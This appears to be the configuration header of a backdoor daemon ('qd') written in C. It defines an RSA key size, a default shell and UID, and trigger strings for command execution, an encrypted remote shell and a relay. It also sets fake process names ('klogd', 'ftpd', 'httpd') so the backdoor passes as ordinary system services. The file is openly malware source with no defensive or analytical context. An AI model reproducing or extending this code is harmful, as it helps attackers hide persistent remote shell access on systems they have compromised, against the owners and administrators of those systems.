#ifndef _CONF_H
#define _CONF_H

#define Q_RSABITS	4096

#define Q_SHELL	   "sh"		/* bash, sh, csh, ksh (yuck!), etc. */
#define Q_UID      1		/* if defined, run redirects as this user */

#define HIDDEN    "klogd"	/* qdaemon process name disguised */
#define HARMLESS1 "ftpd"	/* ssh process name disguised */
#define HARMLESS2 "httpd"	/* red process name disguised */

#define CODE_EXEC "++exec+"	/* a single command */
#define CODE_SSHD "++ssh+"	/* encrypted q-shell */
#define CODE_RED  "++red+"	/* plain/crypt relay */
#define CODE_SHL  "++shell+"	/* change default shell */
#define CODE_UID  "++uid+"	/* change default uid */
#define CODE_TT   "++tunnel+"	/* tunneling mode, not implemented */

#define WANT_LOGGING		/* send authentication messages to syslog */
#define PIDFILE	  ".q"		/* pid file, to keep qd from spawning multiple
                                   instances of itself, optional */
#endif
